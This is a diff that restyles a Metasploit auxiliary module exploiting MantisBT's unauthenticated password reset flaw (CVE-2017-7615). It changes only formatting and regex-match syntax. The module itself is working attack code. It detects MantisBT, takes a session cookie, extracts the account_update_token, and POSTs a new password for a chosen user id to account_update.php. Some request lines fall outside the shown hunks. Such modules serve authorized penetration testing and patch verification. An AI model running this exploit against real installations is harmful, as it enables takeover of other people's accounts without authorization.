@@ -6,56 +6,55 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'       => "MantisBT password reset",
-      'Description'  => %q{
-        MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.
-      },
-      'License'    => MSF_LICENSE,
-      'Author'     =>
-        [
-          'John (hyp3rlinx) Page',  # initial discovery
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'MantisBT password reset',
+        'Description' => %q{
+          MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'John (hyp3rlinx) Page', # initial discovery
           'Julien (jvoisin) Voisin' # metasploit module
         ],
-      'References'   =>
-        [
+        'References' => [
           ['CVE', '2017-7615'],
           ['EDB', '41890'],
           ['URL', 'https://mantisbt.org/bugs/view.php?id=22690'],
           ['URL', 'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt']
         ],
-      'Platform'     => ['win', 'linux'],
-      'DisclosureDate' => '2017-04-16'))
-
-      register_options(
-        [
-          OptString.new('USERID', [ true, 'User id to reset', 1]),
-          OptString.new('PASSWORD', [ false, 'The new password to set (blank for random)', '']),
-          OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
-        ]
+        'Platform' => ['win', 'linux'],
+        'DisclosureDate' => '2017-04-16'
       )
+    )
+
+    register_options(
+      [
+        OptString.new('USERID', [ true, 'User id to reset', 1]),
+        OptString.new('PASSWORD', [ false, 'The new password to set (blank for random)', '']),
+        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
+      ]
+    )
   end
 
   def check
-    begin
-      res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, '/login_page.php'),
-        'method'=>'GET'
-      })
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/login_page.php'),
+      'method' => 'GET'
+    })
 
-      if res && res.body && res.body.include?('Powered by <a href="http://www.mantisbt.org" title="bug tracking software">MantisBT')
-        vprint_status("MantisBT detected")
-        return Exploit::CheckCode::Detected
-      else
-        vprint_status("Not a MantisBT Instance!")
-        return Exploit::CheckCode::Safe
-      end
-
-    rescue Rex::ConnectionRefused
-      print_error("Connection refused by server.")
+    if res && res.body && res.body.include?('Powered by <a href="http://www.mantisbt.org" title="bug tracking software">MantisBT')
+      vprint_status('MantisBT detected')
+      return Exploit::CheckCode::Detected
+    else
+      vprint_status('Not a MantisBT Instance!')
       return Exploit::CheckCode::Safe
     end
+  rescue Rex::ConnectionRefused
+    print_error('Connection refused by server.')
+    return Exploit::CheckCode::Safe
   end
 
   def run
@@ -69,15 +68,14 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if !res || !res.body
-      fail_with(Failure::UnexpectedReply, "Error in server response. Ensure the server IP is correct.")
+      fail_with(Failure::UnexpectedReply, 'Error in server response. Ensure the server IP is correct.')
     end
 
     cookie = res.get_cookies
 
     if cookie == '' || !(res.body.include? 'Your account information has been verified.')
-      fail_with(Failure::NoAccess, "Authentication failed")
+      fail_with(Failure::NoAccess, 'Authentication failed')
     end
-
 
     if datastore['PASSWORD'].blank?
       password = Rex::Text.rand_text_alpha(8)
@@ -86,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res.body =~ /<input type="hidden" name="account_update_token" value="([a-zA-Z0-9_-]+)"/
-      token = $1
+      token = ::Regexp.last_match(1)
     else
       fail_with(Failure::UnexpectedReply, 'Could not retrieve account_update_token')
     end
@@ -95,12 +93,12 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, '/account_update.php'),
       'method' => 'POST',
       'vars_post' => {
-          'verify_user_id' => datastore['USERID'],
-          'account_update_token' => $1,
-          'realname' => Rex::Text.rand_text_alpha(rand(5) + 8),
-          'password' => password,
-          'password_confirm' => password
-        },
+        'verify_user_id' => datastore['USERID'],
+        'account_update_token' => ::Regexp.last_match(1),
+        'realname' => Rex::Text.rand_text_alpha(rand(8..12)),
+        'password' => password,
+        'password_confirm' => password
+      },
       'cookie' => cookie
     })
 
